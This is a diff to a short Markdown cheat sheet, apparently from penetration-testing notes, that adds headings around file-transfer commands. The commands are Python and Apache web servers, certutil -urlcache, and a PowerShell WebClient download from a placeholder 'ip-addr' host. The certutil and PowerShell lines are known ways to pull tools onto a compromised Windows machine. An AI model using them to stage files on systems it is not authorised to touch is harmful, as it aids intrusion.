@@ -1,12 +1,15 @@
 # File Sharing
 
-```
-python -m SimpleHTTPServer [port]
-```
+## Web server
+
+### Python
 
 ```
+python -m SimpleHTTPServer [port]
 python3 -m http.server [port]
 ```
+
+### Apache
 
 ```
 mv file /var/www/html/ 
@@ -14,13 +17,21 @@ mv file /var/www/html/
 service apache2 start
 ```
 
+### Certutils
+
 ```
 certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]
 ```
 
+### PowerShell
+
 ```
 powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
 ```
+
+## FTP
+
+### Python
 
 ```
 sudo apt-get install python-pyftpdlib
